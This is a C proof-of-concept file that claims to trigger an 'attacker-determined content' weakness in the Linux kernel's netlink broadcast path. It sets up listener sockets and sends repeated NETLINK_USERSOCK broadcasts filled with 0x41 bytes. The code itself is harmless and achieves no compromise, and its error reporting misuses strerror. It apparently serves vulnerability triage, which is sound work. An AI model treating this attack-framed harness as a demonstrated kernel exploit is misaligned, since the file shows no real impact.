/*
 * PoC for WMI-3: Attacker-Determined Content in an Authoritative Position
 * @ do_one_broadcast (net/netlink/af_netlink.c:1473)
 *
 * Trigger: netlink_sendmsg -> netlink_broadcast -> do_one_broadcast
 *
 * Sends a netlink broadcast message to a multicast group.
 * Multiple listening sockets are set up so that skb_clone is exercised
 * in do_one_broadcast (line 1473) for subsequent recipients.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <linux/capability.h>
#include <sys/syscall.h>
#include <pthread.h>
#include <errno.h>
#include <sched.h>

#define NLMSG_HDRLEN     sizeof(struct nlmsghdr)
#define BUF_SIZE         4096
#define TEST_GROUP       1
#define NUM_LISTENERS    4

/* Set up socket to listen on a given netlink multicast group */
static int setup_listener(int protocol, int group)
{
    struct sockaddr_nl addr;
    int fd;

    fd = socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC, protocol);
    if (fd < 0) {
        perror("listener socket");
        return -1;
    }

    memset(&addr, 0, sizeof(addr));
    addr.nl_family = AF_NETLINK;
    addr.nl_groups = group;
    addr.nl_pid = 0; /* kernel assigns */

    if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("listener bind");
        close(fd);
        return -1;
    }

    return fd;
}

/* Send a broadcast message to a multicast group */
static int do_broadcast(int protocol, int group, const void *payload,
                        size_t payload_len)
{
    struct sockaddr_nl addr;
    struct nlmsghdr *nlh;
    struct iovec iov;
    struct msghdr msg;
    int fd, ret;
    size_t total_len;

    fd = socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC, protocol);
    if (fd < 0) {
        perror("sender socket");
        return -1;
    }

    /* Build netlink message */
    total_len = NLMSG_HDRLEN + payload_len;
    nlh = calloc(1, total_len);
    if (!nlh) {
        perror("calloc");
        close(fd);
        return -1;
    }

    nlh->nlmsg_len = total_len;
    nlh->nlmsg_type = 0; /* NLMSG_NOOP or user-defined */
    nlh->nlmsg_flags = 0;
    nlh->nlmsg_seq = 1;
    nlh->nlmsg_pid = 0;

    if (payload && payload_len > 0)
        memcpy(NLMSG_DATA(nlh), payload, payload_len);

    /* Destination: multicast group */
    memset(&addr, 0, sizeof(addr));
    addr.nl_family = AF_NETLINK;
    addr.nl_pid = 0;       /* broadcast to all listeners */
    addr.nl_groups = group; /* multicast group */

    memset(&msg, 0, sizeof(msg));
    msg.msg_name = &addr;
    msg.msg_namelen = sizeof(addr);
    iov.iov_base = nlh;
    iov.iov_len = total_len;
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;

    ret = sendmsg(fd, &msg, 0);
    if (ret < 0)
        perror("sendmsg");

    free(nlh);
    close(fd);
    return ret;
}

/* Thread: listener just reads and discards messages */
static void *listener_thread(void *arg)
{
    int fd = *(int *)arg;
    char buf[BUF_SIZE];
    struct iovec iov;
    struct msghdr msg;
    struct sockaddr_nl from;
    ssize_t n;
    int retries = 5;

    while (retries--) {
        memset(&msg, 0, sizeof(msg));
        msg.msg_name = &from;
        msg.msg_namelen = sizeof(from);
        iov.iov_base = buf;
        iov.iov_len = sizeof(buf);
        msg.msg_iov = &iov;
        msg.msg_iovlen = 1;

        n = recvmsg(fd, &msg, MSG_DONTWAIT);
        if (n > 0)
            printf("[listener] received %zd bytes\n", n);
        else if (n < 0 && errno != EAGAIN)
            break;

        usleep(10000); /* 10ms */
    }

    return NULL;
}

int main(int argc, char **argv)
{
    int protocol = NETLINK_USERSOCK;
    int group = TEST_GROUP;
    int listeners[NUM_LISTENERS];
    pthread_t threads[NUM_LISTENERS];
    int i, ret;
    char payload[256];

    printf("=== PoC: Attacker-Determined Content in do_one_broadcast ===\n");
    printf("Protocol: NETLINK_USERSOCK (%d)\n", protocol);
    printf("Group: %d\n", group);
    printf("Listeners: %d\n", NUM_LISTENERS);

    /* Set up listener sockets */
    memset(listeners, 0, sizeof(listeners));
    for (i = 0; i < NUM_LISTENERS; i++) {
        listeners[i] = setup_listener(protocol, group);
        if (listeners[i] < 0) {
            fprintf(stderr, "Failed to create listener %d\n", i);
            /* Continue with fewer listeners */
        } else {
            printf("Listener %d: fd=%d\n", i, listeners[i]);
        }
    }

    /* Start listener threads to drain receive queues */
    for (i = 0; i < NUM_LISTENERS; i++) {
        if (listeners[i] >= 0) {
            if (pthread_create(&threads[i], NULL, listener_thread,
                               &listeners[i]) != 0) {
                perror("pthread_create");
                listeners[i] = -1;
            }
        }
    }

    /* Give listeners time to bind */
    usleep(100000);

    /* Send broadcast message with attacker-controlled payload */
    memset(payload, 0x41, sizeof(payload));

    printf("\nSending broadcast message (%zu bytes payload)...\n", sizeof(payload));
    ret = do_broadcast(protocol, group, payload, sizeof(payload));
    printf("Broadcast sendmsg returned: %d (%s)\n", ret,
           ret < 0 ? strerror(-ret) : "OK");

    /* Multiple broadcasts to exercise skb_clone path repeatedly */
    for (i = 0; i < 10; i++) {
        payload[0] = i; /* vary payload */
        ret = do_broadcast(protocol, group, payload, sizeof(payload));
        if (ret < 0)
            break;
        usleep(1000);
    }

    /* Wait for listeners */
    for (i = 0; i < NUM_LISTENERS; i++) {
        if (listeners[i] >= 0)
            pthread_join(threads[i], NULL);
    }

    /* Cleanup */
    for (i = 0; i < NUM_LISTENERS; i++) {
        if (listeners[i] >= 0)
            close(listeners[i]);
    }

    printf("=== PoC complete ===\n");
    return 0;
}
